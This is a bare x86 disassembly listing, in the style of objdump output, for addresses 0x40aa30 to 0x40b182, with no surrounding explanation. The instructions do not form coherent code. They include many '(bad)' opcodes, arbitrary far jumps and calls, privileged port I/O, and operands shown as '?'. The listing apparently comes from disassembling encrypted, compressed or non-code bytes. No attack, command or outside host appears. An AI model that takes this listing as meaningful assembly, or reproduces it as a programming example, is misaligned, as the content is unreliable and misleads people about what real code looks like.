  40aa30:	mov    dl,0xd4
  40aa32:	push   ecx
  40aa33:	sahf   
  40aa34:	popa   
  40aa35:	dec    ecx
  40aa36:	jmp    0xfc0b:0x87c6c791
  40aa3d:	data16 out 0x5e,al
  40aa40:	out    dx,al
  40aa41:	rcl    DWORD PTR [eax+0x3c514355],cl
  40aa47:	xchg   ebp,eax
  40aa48:	pop    ebx
  40aa49:	jl     0x40aa5a
  40aa4b:	aas    
  40aa4c:	xchg   DWORD PTR [ebx],esp
  40aa4e:	shl    DWORD PTR [edx+edx*2+0x715e266f],1
  40aa55:	inc    ebx
  40aa56:	rol    DWORD PTR ds:0xc19b9924,0xdf
  40aa5d:	add    DWORD PTR [ebx-0xadaa81c],edi
  40aa63:	xchg   edx,eax
  40aa64:	sub    DWORD PTR [esi+0x23],0x5e
  40aa68:	adc    dl,dh
  40aa6a:	pop    ss
  40aa6b:	js     0x40aaa6
  40aa6d:	xchg   ebx,eax
  40aa6e:	int3   
  40aa6f:	es pop ecx
  40aa71:	sub    al,0x99
  40aa73:	pop    edi
  40aa74:	into   
  40aa75:	add    eax,DWORD PTR [edx]
  40aa77:	loope  0x40aa8f
  40aa79:	or     dh,BYTE PTR [edx-0x58]
  40aa7c:	in     eax,dx
  40aa7d:	in     eax,0x71
  40aa7f:	push   0xfffffff6
  40aa81:	mov    edi,DWORD PTR [edx-0x1b257d2]
  40aa87:	xlat   BYTE PTR ds:[ebx]
  40aa88:	in     al,dx
  40aa89:	inc    eax
  40aa8a:	sbb    ah,BYTE PTR [ebp+0x43]
  40aa8d:	sar    DWORD PTR [edx-0x6b48ff1c],0x98
  40aa94:	inc    ebp
  40aa95:	sbb    DWORD PTR [ebx-0x70dc2ba2],edx
  40aa9b:	inc    esi
  40aa9c:	mov    ecx,0x7d1d620d
  40aaa1:	stos   DWORD PTR es:[edi],eax
  40aaa2:	xchg   BYTE PTR ds:0x9a7ec199,ch
  40aaa8:	inc    ebx
  40aaa9:	mov    eax,ds:0x67760428
  40aaae:	test   eax,0x5fcce4da
  40aab3:	pop    edx
  40aab4:	cmc    
  40aab5:	pop    es
  40aab6:	adc    DWORD PTR [ebx+0xd],edx
  40aab9:	adc    cl,bl
  40aabb:	ins    DWORD PTR es:[edi],dx
  40aabc:	cdq    
  40aabd:	xchg   edx,eax
  40aabe:	or     BYTE PTR [ebx],0x9b
  40aac1:	or     ebx,esi
  40aac3:	inc    eax
  40aac4:	push   ds
  40aac5:	sbb    eax,0xe1a5ea91
  40aaca:	add    al,0x12
  40aacc:	pop    ebx
  40aacd:	hlt    
  40aace:	shl    BYTE PTR [eax-0x71],0xa4
  40aad2:	jle    0x40aada
  40aad4:	add    ah,BYTE PTR [edx]
  40aad6:	test   eax,0xa9220886
  40aadb:	sbb    BYTE PTR [ebx+eax*4],dh
  40aade:	pushf  
  40aadf:	shl    BYTE PTR [eax],0x1d
  40aae2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40aae3:	sub    DWORD PTR [edx-0x2],0x20
  40aae7:	dec    esp
  40aae8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40aae9:	add    eax,0xd04ba045
  40aaee:	(bad)  
  40aaef:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40aaf0:	rol    dl,cl
  40aaf2:	push   cs
  40aaf3:	shr    ecx,0xb1
  40aaf6:	adc    al,0x2c
  40aaf8:	mov    bl,0xab
  40aafa:	mov    esp,0xc0fc421
  40aaff:	hlt    
  40ab00:	cmp    ecx,DWORD PTR [ecx-0x114695a]
  40ab06:	(bad)  
  40ab08:	jmp    0x40ab31
  40ab0a:	es jl  0x40ab7c
  40ab0d:	loop   0x40ab1f
  40ab0f:	loopne 0x40aabd
  40ab11:	dec    ebx
  40ab12:	inc    ecx
  40ab13:	clc    
  40ab14:	daa    
  40ab15:	mov    eax,ds:0x3fe46cae
  40ab1a:	dec    ebp
  40ab1b:	addr16 aas 
  40ab1d:	(bad)  
  40ab1e:	fld    QWORD PTR gs:[edi]
  40ab21:	pop    edi
  40ab22:	fbstp  TBYTE PTR [esi-0x5a892f2c]
  40ab28:	test   eax,0xf94f546a
  40ab2d:	pop    eax
  40ab2e:	mov    bl,0x21
  40ab30:	inc    ecx
  40ab31:	retf   0xeec3
  40ab34:	(bad)  
  40ab35:	add    DWORD PTR fs:[eax-0x1b2f63ee],ecx
  40ab3c:	xor    BYTE PTR [edi],bh
  40ab3e:	add    eax,0x9cbf60ea
  40ab43:	and    bh,BYTE PTR [edx]
  40ab45:	sbb    eax,0x3aaa1d5d
  40ab4a:	aas    
  40ab4b:	jle    0x40ab8e
  40ab4d:	test   eax,0x4d754ec8
  40ab52:	retf   
  40ab53:	loopne 0x40abd2
  40ab55:	repz lds edi,FWORD PTR [eax+eiz*1+0x5ef52041]
  40ab5d:	mov    bl,al
  40ab5f:	out    0x46,al
  40ab61:	sti    
  40ab62:	mov    esp,0xf1abb327
  40ab67:	popa   
  40ab68:	jns    0x40abd8
  40ab6a:	xor    BYTE PTR [esi-0x4b],0xd1
  40ab6e:	pop    ebx
  40ab6f:	adc    al,0x86
  40ab71:	das    
  40ab72:	sahf   
  40ab73:	cwde   
  40ab74:	test   BYTE PTR [ebx],0x6
  40ab77:	cwde   
  40ab78:	popa   
  40ab79:	xchg   edi,eax
  40ab7a:	fnstcw WORD PTR ds:0x920185ec
  40ab80:	jge    0x40ab93
  40ab82:	mov    bh,BYTE PTR [eax]
  40ab84:	enter  0x3fc4,0x8f
  40ab88:	push   ebp
  40ab89:	clc    
  40ab8a:	sar    DWORD PTR [ebx+0x4676a0fc],cl
  40ab90:	dec    ecx
  40ab91:	or     BYTE PTR [ecx-0x65],0xb9
  40ab95:	xor    DWORD PTR [esi],edx
  40ab97:	aaa    
  40ab98:	mov    al,0xcf
  40ab9a:	jp     0x40abe6
  40ab9c:	pop    eax
  40ab9d:	mov    dl,0x41
  40ab9f:	pusha  
  40aba0:	adc    DWORD PTR [edx],esi
  40aba2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40aba3:	cld    
  40aba4:	push   0x641af73d
  40aba9:	aam    0x1b
  40abab:	xor    BYTE PTR [ebx+0x7f1f8692],ah
  40abb1:	mov    dh,0x4f
  40abb3:	into   
  40abb4:	enter  0xf16d,0xa1
  40abb8:	push   0x86be9d7a
  40abbd:	fld    DWORD PTR [edi+0x6f2558cb]
  40abc3:	mov    al,0xec
  40abc5:	push   ecx
  40abc6:	mov    al,BYTE PTR [esi]
  40abc8:	mov    ds:0xb56e73f1,eax
  40abcd:	or     ch,BYTE PTR ds:0xb9158a1c
  40abd3:	gs inc esi
  40abd5:	xor    dl,BYTE PTR [esp+edx*1+0x41]
  40abd9:	push   edx
  40abda:	mov    al,0x9e
  40abdc:	jg     0x40abc9
  40abde:	sti    
  40abdf:	scas   eax,DWORD PTR es:[edi]
  40abe0:	xor    cl,al
  40abe2:	retf   
  40abe3:	and    ebp,edi
  40abe5:	comiss xmm7,DWORD PTR [ebx]
  40abe8:	retf   
  40abe9:	xchg   esp,eax
  40abea:	daa    
  40abeb:	fdiv   DWORD PTR [ecx-0x23]
  40abee:	outs   dx,DWORD PTR ds:[esi]
  40abef:	cmp    eax,0xfa68c2c2
  40abf4:	lea    ecx,[edx-0x21]
  40abf7:	mov    eax,ds:0xbefe8e2c
  40abfc:	movntps XMMWORD PTR [eax+edx*1+0x1d],xmm3
  40ac01:	dec    edi
  40ac02:	jg     0x40ac02
  40ac04:	outs   dx,BYTE PTR ds:[esi]
  40ac05:	dec    eax
  40ac06:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ac07:	js     0x40ac53
  40ac09:	ins    DWORD PTR es:[edi],dx
  40ac0a:	sbb    eax,0xb461d076
  40ac0f:	push   esp
  40ac10:	push   0xb4df4ff1
  40ac15:	popf   
  40ac16:	(bad)  
  40ac17:	xchg   ebx,eax
  40ac18:	shr    BYTE PTR [ebx],1
  40ac1a:	sar    DWORD PTR [eax+esi*8],0x76
  40ac1e:	int3   
  40ac1f:	jmp    0x713a:0x3f07823d
  40ac26:	shl    DWORD PTR [edx],0x3
  40ac29:	adc    BYTE PTR [edx-0x23],al
  40ac2c:	mov    edi,0xb878b652
  40ac31:	call   0x82b14206
  40ac36:	jnp    0x40ac53
  40ac38:	fst    DWORD PTR [ebp+0x8ad0a6]
  40ac3e:	push   esi
  40ac3f:	pop    ss
  40ac40:	pop    ecx
  40ac41:	daa    
  40ac42:	stos   BYTE PTR es:[edi],al
  40ac43:	xor    BYTE PTR [ebx+0x1f72b63c],bl
  40ac49:	aas    
  40ac4a:	xchg   DWORD PTR [edx],edi
  40ac4c:	stc    
  40ac4d:	les    esi,FWORD PTR [ebx]
  40ac4f:	int3   
  40ac50:	jp     0x40ac51
  40ac52:	cmp    DWORD PTR [ebx],ecx
  40ac54:	sbb    cl,BYTE PTR [esi]
  40ac56:	int    0x3a
  40ac58:	push   ss
  40ac59:	jae    0x40ac30
  40ac5b:	test   al,0x9
  40ac5d:	test   BYTE PTR [eax-0x2b],cl
  40ac60:	lock fiadd WORD PTR [esi]
  40ac63:	mov    edx,eax
  40ac65:	cmp    ebp,edi
  40ac67:	add    eax,0x1c21315c
  40ac6c:	and    esi,DWORD PTR [ebx]
  40ac6e:	addr16 clc 
  40ac70:	and    al,0xb0
  40ac72:	pop    edx
  40ac73:	jl     0x40ac2b
  40ac75:	xlat   BYTE PTR ds:[ebx]
  40ac76:	ret    0xf6b5
  40ac79:	sub    edi,esi
  40ac7b:	fisub  WORD PTR [eax]
  40ac7d:	mov    dl,0xaa
  40ac7f:	adc    eax,DWORD PTR [esp+ebp*4+0x7de694da]
  40ac86:	dec    eax
  40ac87:	push   0x35
  40ac89:	mov    bl,0x3c
  40ac8b:	repz sub ebx,DWORD PTR [edx+0xf34a495]
  40ac92:	mov    dh,0x9f
  40ac94:	xchg   ecx,eax
  40ac95:	arpl   WORD PTR [ebx+0x70b6110b],bp
  40ac9b:	pop    ebp
  40ac9c:	mov    cl,0x60
  40ac9e:	into   
  40ac9f:	mov    ecx,0xd71caeb8
  40aca4:	clc    
  40aca5:	xchg   BYTE PTR [esi-0x4501767b],bl
  40acab:	ret    
  40acac:	ja     0x40acd4
  40acae:	in     al,0xf0
  40acb0:	or     al,0xd
  40acb2:	pop    esi
  40acb3:	fbstp  TBYTE PTR [esp+ebx*4]
  40acb6:	push   ds
  40acb7:	inc    ecx
  40acb8:	inc    ebx
  40acb9:	sbb    ecx,DWORD PTR [ecx+ecx*8-0x7d]
  40acbd:	jge    0x40ac54
  40acbf:	xlat   BYTE PTR ds:[ebx]
  40acc0:	add    bh,BYTE PTR [esi]
  40acc2:	repnz push ecx
  40acc4:	icebp  
  40acc5:	sbb    al,0xe2
  40acc7:	faddp  st(3),st
  40acc9:	aaa    
  40acca:	fnstenv [edx+ecx*1-0xe]
  40acce:	aam    0x4c
  40acd0:	jmp    0x43eb:0xc1bce5df
  40acd7:	dec    eax
  40acd8:	retf   
  40acd9:	loop   0x40ad50
  40acdb:	jno    0x40ac9d
  40acdd:	xor    DWORD PTR [edx+0x72cbcbe1],ebx
  40ace3:	fild   WORD PTR [ecx+0x4a1b5689]
  40ace9:	jnp    0x40acb5
  40aceb:	imul   ebx,DWORD PTR [ebx],0xba6e84be
  40acf1:	jge    0x40acf5
  40acf3:	xlat   BYTE PTR ds:[ebx]
  40acf4:	lea    ebp,[eax]
  40acf6:	cli    
  40acf7:	neg    BYTE PTR [eax+edi*4-0xc]
  40acfb:	lahf   
  40acfc:	test   eax,0x6d810994
  40ad01:	ins    DWORD PTR es:[edi],dx
  40ad02:	mov    cl,0x4d
  40ad04:	fbld   TBYTE PTR [edi+ebx*1-0x3a616368]
  40ad0b:	ret    
  40ad0c:	inc    esp
  40ad0d:	inc    edx
  40ad0e:	xor    BYTE PTR [eax+eiz*2+0x53],dl
  40ad12:	xchg   ecx,eax
  40ad13:	xchg   ebp,eax
  40ad14:	and    esp,edi
  40ad16:	popa   
  40ad17:	mov    eax,0x608758e5
  40ad1c:	push   eax
  40ad1d:	pop    eax
  40ad1e:	mov    BYTE PTR [ebx],ch
  40ad20:	pop    eax
  40ad21:	loope  0x40ad69
  40ad23:	mov    edx,ebx
  40ad25:	jne    0x40ad98
  40ad27:	pop    edi
  40ad28:	(bad)  
  40ad2b:	mov    esp,0x3a1fc165
  40ad30:	sub    DWORD PTR [ebx-0x12],esi
  40ad33:	es out 0xe2,eax
  40ad36:	xchg   edx,eax
  40ad37:	jne    0x40acf5
  40ad39:	pop    edx
  40ad3a:	call   0x133adf6d
  40ad3f:	jg     0x40ad1c
  40ad41:	out    dx,eax
  40ad42:	fwait
  40ad43:	dec    ecx
  40ad44:	pop    ecx
  40ad45:	imul   ebx,DWORD PTR [ebx-0x7d],0x85d4b44d
  40ad4c:	inc    edx
  40ad4d:	daa    
  40ad4e:	in     eax,dx
  40ad4f:	stos   BYTE PTR es:[edi],al
  40ad50:	(bad)
  40ad54:	sub    bl,BYTE PTR [eax+ebx*2]
  40ad57:	jg     0x40ad0d
  40ad59:	jg     0x40adb4
  40ad5b:	cmc    
  40ad5c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ad5d:	mov    al,0x8f
  40ad5f:	or     al,0x3d
  40ad61:	cli    
  40ad62:	js     0x40ad5b
  40ad64:	fsub   QWORD PTR [ecx+eiz*4+0xf5e21e8]
  40ad6b:	call   0x39d9:0x3e3d3866
  40ad72:	mov    bl,BYTE PTR ds:0x9cd6fe0b
  40ad78:	cmp    cl,ah
  40ad7a:	mov    ds:0x330b16b9,al
  40ad7f:	jne    0x40adad
  40ad81:	cmp    al,0x41
  40ad83:	xlat   BYTE PTR ds:[ebx]
  40ad84:	loope  0x40ad15
  40ad86:	stos   BYTE PTR es:[edi],al
  40ad87:	stos   DWORD PTR es:[edi],eax
  40ad88:	push   edi
  40ad89:	mov    eax,ds:0xe3a7e07f
  40ad8e:	push   ebx
  40ad8f:	les    edx,FWORD PTR [ecx-0x21]
  40ad92:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ad93:	ins    DWORD PTR es:[edi],dx
  40ad94:	mov    ds:0x3838e4aa,eax
  40ad99:	and    al,0x39
  40ad9b:	add    eax,0xd095557f
  40ada0:	jl     0x40adb9
  40ada2:	clc    
  40ada3:	sbb    DWORD PTR [edi-0x7a],edx
  40ada6:	inc    esp
  40ada7:	call   0x5f08:0x6ef6ffa2
  40adae:	adc    esp,DWORD PTR [edx]
  40adb0:	sub    DWORD PTR [edx+0x7253ada5],esp
  40adb6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40adb7:	lds    eax,FWORD PTR [edi+0x600f1e55]
  40adbd:	mov    ah,0xc5
  40adbf:	jmp    0xf3fc74ac
  40adc4:	lds    ebx,FWORD PTR [ebx-0x66100cef]
  40adca:	push   cs
  40adcb:	mov    dh,0x96
  40adcd:	pop    ebx
  40adce:	int3   
  40adcf:	xor    al,0x82
  40add1:	xor    dl,bl
  40add3:	adc    dl,bh
  40add5:	loopne 0x40ae3b
  40add7:	test   eax,0x1c2861ae
  40addc:	jbe    0x40ad88
  40adde:	call   0x699a:0x6261d590
  40ade5:	test   eax,0x3f0782d6
  40adea:	ins    BYTE PTR es:[edi],dx
  40adeb:	sub    BYTE PTR [ecx+0x569a8ce4],0xa6
  40adf2:	imul   ebx,edx,0x4acd817f
  40adf8:	pop    esi
  40adf9:	push   ds
  40adfa:	mov    eax,0xcbf6430e
  40adff:	loopne 0x40adc2
  40ae01:	adc    esi,DWORD PTR [edi-0x488844af]
  40ae07:	inc    eax
  40ae08:	shl    BYTE PTR [edi],0x4e
  40ae0b:	cmp    DWORD PTR [eax],ebp
  40ae0d:	jne    0x40ae0a
  40ae0f:	int3   
  40ae10:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ae11:	into   
  40ae12:	repnz sbb al,0xaa
  40ae15:	xchg   DWORD PTR [eax],ecx
  40ae17:	xchg   ebp,eax
  40ae18:	scas   eax,DWORD PTR es:[edi]
  40ae19:	sbb    al,0x46
  40ae1b:	dec    eax
  40ae1c:	aaa    
  40ae1d:	daa    
  40ae1e:	(bad)  
  40ae1f:	jae    0x40ae79
  40ae21:	call   0xdfa1:0xf8bbd73a
  40ae28:	adc    BYTE PTR [ecx-0x68],ch
  40ae2b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ae2c:	inc    edi
  40ae2d:	mov    edi,0x9f60b6f7
  40ae32:	jge    0x40ae23
  40ae34:	ret    
  40ae35:	ins    BYTE PTR es:[edi],dx
  40ae36:	dec    ecx
  40ae37:	ins    BYTE PTR es:[edi],dx
  40ae38:	das    
  40ae39:	adc    dh,BYTE PTR [ecx-0x4b25611f]
  40ae3f:	test   al,0x5d
  40ae41:	test   DWORD PTR [esi+0x74],ebp
  40ae44:	test   eax,0x70ee0932
  40ae49:	push   esi
  40ae4a:	mov    eax,0xd6638de1
  40ae4f:	mov    esp,0xac5aea13
  40ae54:	jge    0x40aea8
  40ae56:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ae57:	data16 cmp al,BYTE PTR [esi+0x6b4481fd]
  40ae5e:	push   ebx
  40ae5f:	bound  ebp,QWORD PTR [edi+eiz*8-0xf018a44]
  40ae66:	(bad)  
  40ae67:	loop   0x40ae66
  40ae69:	mov    ebp,0xb374b001
  40ae6e:	xchg   BYTE PTR [esi],bl
  40ae70:	cs jp  0x40aeb1
  40ae73:	dec    ebp
  40ae74:	push   ebx
  40ae75:	icebp  
  40ae76:	test   edx,eax
  40ae78:	mov    BYTE PTR [esi],dl
  40ae7a:	inc    ebx
  40ae7b:	out    dx,al
  40ae7c:	pop    eax
  40ae7d:	ret    0x6323
  40ae80:	or     ah,BYTE PTR [edi+0x6f]
  40ae83:	ret    0x744b
  40ae86:	dec    esp
  40ae87:	les    ecx,FWORD PTR fs:[ebx+0x44a35f1e]
  40ae8e:	mov    edx,?
  40ae90:	xchg   esi,eax
  40ae91:	pushf  
  40ae92:	ss or  ecx,edi
  40ae95:	jbe    0x40ae5b
  40ae97:	cmp    ch,BYTE PTR [eax]
  40ae99:	inc    ecx
  40ae9a:	and    BYTE PTR [ecx+0x46],ah
  40ae9d:	test   al,0x7d
  40ae9f:	mov    ebx,0xb2cd1887
  40aea4:	pushf  
  40aea5:	push   edx
  40aea6:	pop    es
  40aea7:	mul    ebp
  40aea9:	fsub   DWORD PTR [ecx+0x3298882a]
  40aeaf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40aeb0:	or     eax,0xc22634fc
  40aeb5:	retf   0x53bc
  40aeb8:	fwait
  40aeb9:	pop    ebp
  40aeba:	mov    bh,0xfd
  40aebc:	cmp    ah,bh
  40aebe:	mov    WORD PTR [esi],ds
  40aec0:	xor    DWORD PTR [ebp-0x5d70c660],esp
  40aec6:	fwait
  40aec7:	xchg   edi,eax
  40aec8:	shl    BYTE PTR [eax+0x5ab2857d],cl
  40aece:	dec    esi
  40aecf:	aad    0xa7
  40aed1:	sbb    DWORD PTR [edx],esp
  40aed3:	test   DWORD PTR [esi-0x26],edi
  40aed6:	xor    al,0xf8
  40aed8:	xlat   BYTE PTR ds:[ebx]
  40aed9:	jb     0x40aefa
  40aedb:	fneni(8087 only) 
  40aedd:	mov    ch,0xd3
  40aedf:	es mov ecx,0x5749862a
  40aee5:	(bad)  
  40aee6:	cmc    
  40aee7:	pop    ebx
  40aee8:	adc    al,0xa3
  40aeea:	test   al,0xe9
  40aeec:	mov    WORD PTR [esi],?
  40aeee:	adc    ebx,DWORD PTR [ebx]
  40aef0:	push   edi
  40aef1:	and    DWORD PTR [edi+0x3a],ebx
  40aef4:	xor    eax,0x54c85b6f
  40aef9:	adc    dh,BYTE PTR [ebp+edx*8-0x6b6bb883]
  40af00:	leave  
  40af01:	not    dl
  40af03:	pop    eax
  40af04:	pop    ebx
  40af05:	xchg   DWORD PTR [ebx+ebp*2-0x665e4803],eax
  40af0c:	out    0xcf,eax
  40af0e:	push   ebx
  40af0f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40af10:	mov    ds:0x82d6acbc,al
  40af15:	sub    edi,DWORD PTR [esi-0xa720fa1]
  40af1b:	pop    ecx
  40af1c:	aas    
  40af1d:	jbe    0x40af5d
  40af1f:	jbe    0x40af42
  40af21:	adc    esi,DWORD PTR [eax-0x352ea192]
  40af27:	and    BYTE PTR [eax+0x1a44308d],0x82
  40af2e:	jge    0x40af57
  40af30:	sbb    BYTE PTR [ecx+0x3370c15c],ch
  40af36:	stc    
  40af37:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40af38:	retf   0xd819
  40af3b:	pusha  
  40af3c:	mov    esi,0xbe9c033c
  40af41:	adc    BYTE PTR [esi-0x4e11fb21],0x5d
  40af48:	jg     0x40af1f
  40af4a:	stos   BYTE PTR es:[edi],al
  40af4b:	jbe    0x40aef9
  40af4d:	test   al,0xf6
  40af4f:	fs push edi
  40af51:	jg     0x40af61
  40af53:	push   es
  40af54:	out    dx,eax
  40af55:	mov    ecx,0x4ccaaafc
  40af5a:	iret   
  40af5b:	xor    ecx,DWORD PTR [ecx]
  40af5d:	sub    bh,dl
  40af5f:	mov    ebp,DWORD PTR [eax-0x702db1e7]
  40af65:	sub    esi,esp
  40af67:	jge    0x40af05
  40af69:	cmc    
  40af6a:	and    DWORD PTR ds:0x8a94974d,0x16
  40af71:	add    bl,BYTE PTR [eax+0x2af9fb62]
  40af77:	imul   BYTE PTR [edx-0x10808b2b]
  40af7d:	dec    ebx
  40af7e:	or     dh,BYTE PTR [edx-0x59]
  40af81:	pop    esp
  40af82:	enter  0x8e1e,0x83
  40af86:	aaa    
  40af87:	cld    
  40af88:	adc    dl,al
  40af8a:	adc    cl,BYTE PTR [edi-0x7f]
  40af8d:	call   0xa6327464
  40af92:	test   BYTE PTR [edi-0x80],0x6b
  40af96:	sbb    BYTE PTR [edi+0x0],0xe2
  40af9a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40af9c:	lahf   
  40af9d:	ds int3 
  40af9f:	sub    BYTE PTR [eax-0x4552f452],dh
  40afa5:	or     dh,BYTE PTR [edi+edi*1+0x4c0e6a5d]
  40afac:	jno    0x40af47
  40afae:	or     al,0xa0
  40afb0:	popa   
  40afb1:	xchg   ecx,eax
  40afb2:	xchg   edx,eax
  40afb3:	xchg   edx,eax
  40afb4:	loop   0x40af75
  40afb6:	and    edx,DWORD PTR [ebx+0x24]
  40afb9:	je     0x40af40
  40afbb:	and    al,0xb7
  40afbd:	mov    bh,0x4b
  40afbf:	mov    ebp,0x4e430b0a
  40afc4:	mov    edx,0xa98a4667
  40afc9:	cmc    
  40afca:	and    al,0xac
  40afcc:	sub    eax,0xbc8877f1
  40afd1:	cdq    
  40afd2:	lods   al,BYTE PTR ds:[esi]
  40afd3:	scas   al,BYTE PTR es:[edi]
  40afd4:	or     edi,DWORD PTR [edi-0x5d4cfb62]
  40afda:	int3   
  40afdb:	(bad)  
  40afdc:	pop    esp
  40afdd:	xchg   BYTE PTR [edx+0x23dd1162],dh
  40afe3:	jb     0x40b03c
  40afe5:	shl    DWORD PTR [esi+0x74],1
  40afe8:	jl     0x40afa0
  40afea:	pop    ebx
  40afeb:	dec    ebp
  40afec:	test   eax,0xd412d392
  40aff1:	dec    DWORD PTR [edi+edi*2+0x49]
  40aff5:	in     al,dx
  40aff6:	sti    
  40aff7:	add    cl,dl
  40aff9:	jne    0x40affb
  40affb:	(bad)  
  40affc:	cmp    al,0x6e
  40affe:	int    0xaf
  40b000:	mov    ?,eax
  40b002:	loop   0x40aff2
  40b004:	lea    esi,[ebp+edx*8+0x6bc7248a]
  40b00b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b00c:	push   ecx
  40b00d:	inc    ebx
  40b00e:	mov    ebx,0x16b9ec2a
  40b013:	enter  0xba16,0x1f
  40b017:	scas   al,BYTE PTR es:[edi]
  40b018:	add    al,0x91
  40b01a:	inc    edi
  40b01b:	retf   0x2919
  40b01e:	adc    eax,0x7828626d
  40b023:	repnz div DWORD PTR [di]
  40b027:	sahf   
  40b028:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b029:	push   esi
  40b02a:	dec    esp
  40b02b:	stos   DWORD PTR es:[edi],eax
  40b02c:	ds cwde 
  40b02e:	repz rol esp,0x88
  40b032:	and    bh,ah
  40b034:	inc    ebx
  40b035:	call   0x6bf6:0x3193714e
  40b03c:	add    eax,0x4d4e3295
  40b041:	sbb    al,0x3a
  40b043:	push   edi
  40b044:	sub    eax,0xbf9e0f2f
  40b049:	les    ebp,FWORD PTR [esi-0x2c]
  40b04c:	xchg   DWORD PTR [eax],edx
  40b04e:	sbb    DWORD PTR ds:[edi+esi*2],esi
  40b052:	push   ss
  40b053:	inc    ebp
  40b054:	mov    al,ds:0x9312a245
  40b059:	xor    eax,0x471257fe
  40b05e:	mov    esp,0xa30cacc4
  40b063:	in     al,dx
  40b064:	dec    esi
  40b065:	inc    eax
  40b066:	mov    bh,0x99
  40b068:	mov    eax,ds:0x5de90181
  40b06d:	mov    WORD PTR [edi],gs
  40b06f:	hlt    
  40b070:	mov    ebp,0x4b2e85af
  40b075:	xchg   esp,ecx
  40b077:	sar    BYTE PTR [ebp+0x6b112cc6],cl
  40b07d:	call   FWORD PTR [ebp+0x18]
  40b080:	sbb    BYTE PTR [ebx+0x53bebcbc],dh
  40b086:	xchg   ebp,eax
  40b087:	sbb    al,0xef
  40b089:	and    BYTE PTR [ebx+ebx*1],ah
  40b08c:	(bad)  
  40b08d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b08e:	fwait
  40b08f:	mov    ds:0xc9d5c261,al
  40b094:	test   DWORD PTR [edx+ebp*8+0x0],esi
  40b098:	pop    ecx
  40b099:	cli    
  40b09a:	xchg   ecx,eax
  40b09b:	outs   dx,BYTE PTR ds:[esi]
  40b09c:	push   0xffffffac
  40b09e:	(bad)  
  40b09f:	call   0xc45d:0x39396cab
  40b0a6:	call   FWORD PTR [esi+0xb06a442]
  40b0ac:	pop    edi
  40b0ad:	push   edx
  40b0ae:	das    
  40b0af:	push   eax
  40b0b0:	push   esi
  40b0b1:	jo     0x40b12e
  40b0b3:	mov    esp,0x3dec2a88
  40b0b8:	sub    ch,cl
  40b0ba:	sahf   
  40b0bb:	mov    cl,0x78
  40b0bd:	xchg   edx,eax
  40b0be:	mov    eax,ds:0x70c60018
  40b0c3:	jecxz  0x40b05e
  40b0c5:	(bad)  [edx-0x59]
  40b0c8:	add    ebp,DWORD PTR [ebp-0x76]
  40b0cb:	add    edx,DWORD PTR [edx-0x5629084c]
  40b0d1:	push   esp
  40b0d2:	leave  
  40b0d3:	fstp   TBYTE PTR [eax]
  40b0d5:	fdiv   QWORD PTR [ecx+0x78232874]
  40b0db:	ficom  DWORD PTR [ebp-0x55]
  40b0de:	test   DWORD PTR [edx],0x574d243
  40b0e4:	stos   DWORD PTR es:[edi],eax
  40b0e5:	call   0x2ff582ed
  40b0ea:	xlat   BYTE PTR ds:[ebx]
  40b0eb:	mov    ecx,0x9cb291d6
  40b0f0:	push   edi
  40b0f1:	pop    fs
  40b0f3:	and    BYTE PTR [edi+0x2683929e],0x66
  40b0fa:	xchg   ecx,eax
  40b0fb:	xor    bl,BYTE PTR [edi]
  40b0fd:	and    al,BYTE PTR [ebx+ebx*2-0x73]
  40b101:	jnp    0x40b178
  40b103:	add    BYTE PTR [edi+0x25],cl
  40b106:	push   edi
  40b107:	jbe    0x40b172
  40b109:	sar    esp,1
  40b10b:	aas    
  40b10c:	loopne 0x40b127
  40b10e:	cmp    al,0x7c
  40b110:	(bad)  
  40b112:	int    0x0
  40b114:	and    BYTE PTR [edi-0x67],bl
  40b117:	inc    ebp
  40b118:	mov    ch,0xa8
  40b11a:	cmp    BYTE PTR [esi+ebp*1+0x23],0xac
  40b11f:	and    BYTE PTR [esp+esi*8],dl
  40b122:	inc    esp
  40b123:	adc    eax,0x737e2ac9
  40b128:	or     al,0x74
  40b12a:	sub    dh,BYTE PTR [esi+0x7911cd4a]
  40b130:	outs   dx,DWORD PTR ds:[esi]
  40b131:	adc    BYTE PTR [esp+ebp*2-0x38560258],0x95
  40b139:	ins    DWORD PTR es:[edi],dx
  40b13a:	rol    BYTE PTR [esi+esi*1-0x33],cl
  40b13e:	xchg   esp,eax
  40b13f:	(bad)  
  40b140:	push   edx
  40b141:	fld    TBYTE PTR [esp+ecx*1+0x79]
  40b145:	int    0x93
  40b147:	cmc    
  40b148:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b149:	je     0x40b128
  40b14b:	repnz imul esi,DWORD PTR [ecx],0x52
  40b14f:	jmp    0xfd5c:0xa901be4e
  40b156:	jl     0x40b12a
  40b158:	clc    
  40b159:	int    0x5c
  40b15b:	loopne 0x40b0e0
  40b15d:	(bad)  
  40b15e:	pushf  
  40b15f:	xchg   ebp,eax
  40b160:	clc    
  40b161:	mov    edi,0x4b00bc38
  40b166:	sbb    dl,BYTE PTR [edi+0x4b]
  40b169:	mov    dl,0xda
  40b16b:	xchg   esp,eax
  40b16c:	lods   eax,DWORD PTR ds:[esi]
  40b16d:	mov    ds:0x74335044,al
  40b172:	inc    edx
  40b173:	cdq    
  40b174:	jp     0x40b14a
  40b176:	pushf  
  40b177:	cmp    ebp,ecx
  40b179:	jnp    0x40b1f6
  40b17b:	jge    0x40b14c
  40b17d:	add    al,0xe9
  40b17f:	xor    BYTE PTR [edi],dh
  40b181:	pop    esp
  40b182:	or     edi,DWORD PTR [edx-0x2cf13936]
